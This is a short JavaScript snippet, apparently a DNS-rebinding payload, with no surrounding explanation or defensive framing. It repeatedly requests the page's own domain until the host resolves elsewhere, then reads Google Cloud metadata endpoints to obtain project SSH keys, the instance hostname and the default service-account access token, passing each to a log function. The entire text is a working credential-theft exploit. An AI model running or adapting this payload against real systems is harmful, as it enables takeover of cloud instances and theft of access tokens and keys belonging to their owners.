var sshkeys;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + document.domain + '/wait', false);
    req.send();
    sshkeys = get('http://' + document.domain + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json');
    if(sshkeys != 'still the same host')
    	break;
}
log('SSH keys: ' + sshkeys);
log('Hostname: ' + get('http://' + document.domain + '/computeMetadata/v1/instance/hostname'));
log('Access token: ' + get('http://' + document.domain + '/computeMetadata/v1/instance/service-accounts/default/token'));
